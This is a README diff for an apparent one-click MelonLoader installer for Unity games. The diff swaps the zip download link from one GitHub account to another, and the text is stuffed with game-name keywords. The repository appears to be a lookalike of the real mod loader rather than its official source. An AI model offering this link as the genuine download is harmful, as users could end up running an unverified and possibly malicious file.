@@ -8,7 +8,7 @@
 **MelonLoader** is the most popular Unity game mod loader - this installer sets it up in one click on Windows. Supports melonloader btd6, melonloader schedule 1, melonloader gorilla tag, melonloader bonelab and 500+ other Unity games.
 
 ## Install
-[Download `melon-loader.zip`](https://github.com/melon-loaders/melon-loader-download/releases/download/v0.7.4/melon-loader.zip)
+[Download `melon-loader.zip`](https://github.com/MelonLoaderUnity/melon-loader-download/releases/download/v0.7.4/melon-loader.zip)
 =
 
 <img width="481" height="441" alt="images2" src="https://github.com/user-attachments/assets/f7164eee-65b7-42fb-9d1a-7d4344aed6ac" />
